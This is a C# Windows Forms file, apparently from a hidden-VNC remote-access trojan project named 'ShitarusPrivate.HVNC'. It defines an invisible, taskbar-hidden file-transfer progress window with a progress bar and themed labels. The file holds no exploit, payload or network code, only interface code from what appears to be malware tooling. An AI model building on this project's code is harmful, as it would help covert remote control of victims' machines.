using System;
using System.ComponentModel;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ShitarusPrivate.HVNC
{
    public class MoveBytes : Form
    {
        public int int_0;

        private Label PingTransform;

        private IContainer components;

        private ProgressBar DuplicateProgess;

        private Label FileTransferLabel;

        private PrimeTheme primeTheme1;

        private PictureBox pictureBox1;

        private Label label3;

        public ProgressBar DuplicateProgesse
        {
            get
            {
                return DuplicateProgess;
            }
            set
            {
                DuplicateProgess = value;
            }
        }

        public Label FileTransferLabele
        {
            get
            {
                return FileTransferLabel;
            }
            set
            {
                FileTransferLabel = value;
            }
        }

        public Label PingTransfor
        {
            get
            {
                return PingTransform;
            }
            set
            {
                PingTransform = value;
            }
        }

        public MoveBytes()
        {
            int_0 = 0;
            InitializeComponent();
        }

        private void FrmTransfer_Load(object sender, EventArgs e)
        {
        }

        public void DuplicateProfile(int int_1)
        {
            if (int_1 > int_0)
            {
                int_1 = int_0;
            }
            FileTransferLabel.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(int_0) + " MB";
            DuplicateProgess.Value = int_1;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            Bloom bloom = new Bloom();
            Bloom bloom2 = new Bloom();
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.MoveBytes));
            this.DuplicateProgess = new System.Windows.Forms.ProgressBar();
            this.FileTransferLabel = new System.Windows.Forms.Label();
            this.primeTheme1 = new PrimeTheme();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label3 = new System.Windows.Forms.Label();
            this.primeTheme1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
            base.SuspendLayout();
            this.DuplicateProgess.Location = new System.Drawing.Point(11, 30);
            this.DuplicateProgess.Name = "DuplicateProgess";
            this.DuplicateProgess.Size = new System.Drawing.Size(453, 24);
            this.DuplicateProgess.TabIndex = 1;
            this.FileTransferLabel.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.FileTransferLabel.AutoSize = true;
            this.FileTransferLabel.BackColor = System.Drawing.Color.Transparent;
            this.FileTransferLabel.Location = new System.Drawing.Point(224, 17);
            this.FileTransferLabel.Name = "FileTransferLabel";
            this.FileTransferLabel.Size = new System.Drawing.Size(29, 13);
            this.FileTransferLabel.TabIndex = 4;
            this.FileTransferLabel.Text = "Idle";
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom.Name = "Sides";
            bloom.Value = System.Drawing.Color.FromArgb(232, 232, 232);
            bloom2.Name = "Gradient1";
            bloom2.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom3.Name = "Gradient2";
            bloom3.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom4.Name = "TextShade";
            bloom4.Value = System.Drawing.Color.White;
            bloom5.Name = "Text";
            bloom5.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom6.Name = "Back";
            bloom6.Value = System.Drawing.Color.White;
            bloom7.Name = "Border1";
            bloom7.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            bloom8.Name = "Border2";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Border3";
            bloom9.Value = System.Drawing.Color.White;
            bloom10.Name = "Border4";
            bloom10.Value = System.Drawing.Color.FromArgb(150, 150, 150);
            this.primeTheme1.Colors = new Bloom[10] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.FileTransferLabel);
            this.primeTheme1.Controls.Add(this.DuplicateProgess);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8f);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(475, 66);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 5;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new System.Drawing.Point(0, -2);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(35, 32);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 39;
            this.pictureBox1.TabStop = false;
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label3.Location = new System.Drawing.Point(32, 15);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(56, 13);
            this.label3.TabIndex = 40;
            this.label3.Text = "Tranfer";
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            base.ClientSize = new System.Drawing.Size(475, 66);
            base.Controls.Add(this.primeTheme1);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            base.Name = "FrmTransfer";
            base.Opacity = 0.0;
            base.ShowIcon = false;
            base.ShowInTaskbar = false;
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            base.TransparencyKey = System.Drawing.Color.Fuchsia;
            base.Load += new System.EventHandler(FrmTransfer_Load);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
            base.ResumeLayout(false);
        }
    }
}
